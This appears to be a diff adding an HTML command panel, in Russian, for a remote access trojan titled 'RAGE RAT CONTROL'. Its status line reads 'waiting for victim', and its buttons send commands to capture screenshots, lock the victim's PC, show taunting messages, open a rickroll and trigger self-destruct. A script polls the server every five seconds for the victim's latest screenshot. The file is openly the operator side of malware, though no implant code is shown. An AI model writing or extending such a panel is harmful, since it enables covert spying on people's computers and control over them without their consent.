@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>⚡ RAGE RAT CONTROL ⚡</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; }
+        .container { max-width: 800px; margin: 50px auto; border: 1px solid #00ff41; padding: 20px; box-shadow: 0 0 15px #00ff41; }
+        h1 { text-transform: uppercase; letter-spacing: 5px; border-bottom: 2px solid #00ff41; padding-bottom: 10px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px; }
+        button { 
+            background: black; color: #00ff41; border: 1px solid #00ff41; padding: 10px; 
+            font-weight: bold; cursor: pointer; transition: 0.3s;
+        }
+        button:hover { background: #00ff41; color: black; box-shadow: 0 0 20px #00ff41; }
+        .danger { border-color: #ff0000; color: #ff0000; }
+        .danger:hover { background: #ff0000; color: white; box-shadow: 0 0 20px #ff0000; }
+        #preview { width: 100%; margin-top: 20px; border: 1px solid #555; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>RAT Command Center [V1.0]</h1>
+        <p>Статус: <span id="status">ОЖИДАНИЕ ЖЕРТВЫ...</span></p>
+        
+        <div class="btn-grid">
+            <button onclick="cmd('screen')">📸 СДЕЛАТЬ СКРИНШОТ</button>
+            <button onclick="cmd('lock')">🔒 ЗАБЛОКИРОВАТЬ ПК</button>
+            <button onclick="cmd('msg:Вам привет от хакера!')">💬 ПОСЛАТЬ СООБЩЕНИЕ</button>
+            <button onclick="cmd('open:[https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ)')">🎥 ВКЛЮЧИТЬ РИКРОЛЛ</button>
+            <button class="danger" onclick="cmd('self_destruct')">🧨 САМОУНИЧТОЖЕНИЕ</button>
+        </div>
+
+        <div id="screen-box">
+            <h3>Последний скриншот:</h3>
+            <img id="preview" src="" alt="Ждем скрин...">
+        </div>
+    </div>
+
+    <script>
+        function cmd(c) {
+            fetch('/set-command?cmd=' + encodeURIComponent(c))
+                .then(() => alert("Команда отправлена: " + c));
+        }
+
+        // Обновление скриншота каждые 5 сек
+        setInterval(() => {
+            fetch('/get-screen').then(r => r.text()).then(base64 => {
+                if(base64.length > 100) document.getElementById('preview').src = "data:image/png;base64," + base64;
+            });
+        }, 5000);
+    </script>
+</body>
+</html>
